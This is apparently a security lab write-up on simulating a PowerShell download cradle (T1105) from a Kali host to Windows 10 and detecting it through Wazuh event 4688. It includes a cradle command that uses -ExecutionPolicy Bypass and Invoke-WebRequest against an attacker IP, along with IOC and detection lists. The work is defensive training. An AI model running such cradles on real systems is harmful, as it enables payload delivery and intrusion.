# Lab 06 — PowerShell Download Cradle Detection (T1105)

## MITRE ATT&CK
- **Tactic:** Command & Control
- **Technique:** T1105 — Ingress Tool Transfer
- **Detection:** Windows Security Event ID 4688 (Process Creation)

---

## Objective

Simulate a PowerShell download cradle, a technique widely used by attackers to transfer tools or payloads from an external server to the target machine, and detect the behavior through Wazuh SIEM.

---

## Lab Environment

| Machine | Role | IP |
|---|---|---|
| Kali Linux | Attacker / C2 Server | 192.168.56.104 |
| Windows 10 | Target | — |
| Wazuh Server | SIEM | — |

---

## Technical Background

A **download cradle** is a short command executed directly in memory or via command line that downloads a remote file or script and executes or saves it locally. It is one of the most commonly used techniques during the Command & Control and Execution phases of a kill chain.

In this lab, the attacker:
1. Hosts a file on a simple HTTP server on Kali
2. Executes a PowerShell command on Windows using `Invoke-WebRequest` to download the file
3. Wazuh captures Event ID 4688 with the full command-line arguments, exposing the behavior

The critical detection indicator is the `commandLine` field of event 4688, which records the `powershell.exe` process being launched with suspicious flags (`-ExecutionPolicy Bypass`) and a URL pointing to an external host.

---

## Attack Walkthrough

### 1. Set up the HTTP server on Kali

```bash
echo "simulation - download cradle test" > /tmp/payload.txt
cd /tmp
python3 -m http.server 8080
```

The HTTP server simulates C2 infrastructure. The `.txt` file keeps the focus on telemetry without triggering antivirus.

![Kali HTTP Server](images/01-kali-http-server.png)

---

### 2. Confirm the Kali IP address

```bash
ip a
```

![Kali IP](images/02-kali-ip.png)

---

### 3. Execute the Download Cradle on Windows

On Windows 10, open PowerShell and run:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://192.168.56.104:8080/payload.txt' -OutFile 'C:\Users\Public\payload.txt'"
```

The `-ExecutionPolicy Bypass` flag is a classic indicator of PowerShell abuse. The URL points directly to the attacker's server.

![PowerShell Execution](images/03-windows-powershell-execution.png)

---

### 4. Confirm the downloaded file

```powershell
Get-Content C:\Users\Public\payload.txt
```

![File Downloaded](images/04-windows-file-downloaded.png)

---

### 5. Event 4688 detected in Wazuh

In the Wazuh Dashboard, event 4688 was captured with the following relevant fields:

- `data.win.system.eventID: 4688`
- `data.win.eventdata.newProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- `data.win.eventdata.commandLine`: containing `Invoke-WebRequest` and the IP `192.168.56.104`
- `data.win.eventdata.parentProcessName`: parent process that launched PowerShell

![Wazuh 4688 Event](images/05-wazuh-4688-event.png)

---

### 6. Full event details

![Wazuh Event Details](images/06-wazuh-event-details.png)

---

### 7. Request received on the Kali server

The HTTP server log confirmed the GET request originating from Windows:

```
192.168.x.x - - [date time] "GET /payload.txt HTTP/1.1" 200 -
```

![Kali HTTP Request Received](images/07-kali-http-request-received.png)

---

## Indicators of Compromise (IOCs)

| Indicator | Value |
|---|---|
| Process | `powershell.exe` |
| Suspicious flag | `-ExecutionPolicy Bypass` |
| Method | `Invoke-WebRequest` |
| Destination | `http://192.168.56.104:8080/payload.txt` |
| Downloaded file | `C:\Users\Public\payload.txt` |
| Event ID | `4688` |

---

## What the SOC Should Look For

- `powershell.exe` launched with `-ExecutionPolicy Bypass`
- `commandLine` containing `Invoke-WebRequest`, `iwr`, `wget` or `curl` pointing to external IPs
- Files downloaded to public directories such as `C:\Users\Public\`
- Child processes of `powershell.exe` with network arguments
- HTTP requests to non-standard ports (e.g., 8080, 4444, 1337)

---

## File Structure

```
lab-06-download-cradle-T1105/
├── README.md
└── images/
    ├── 01-kali-http-server.png
    ├── 02-kali-ip.png
    ├── 03-windows-powershell-execution.png
    ├── 04-windows-file-downloaded.png
    ├── 05-wazuh-4688-event.png
    ├── 06-wazuh-event-details.png
    └── 07-kali-http-request-received.png
```

---

## References

- [MITRE ATT&CK T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)
- [Windows Event ID 4688 — Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
- [Wazuh Documentation](https://documentation.wazuh.com)
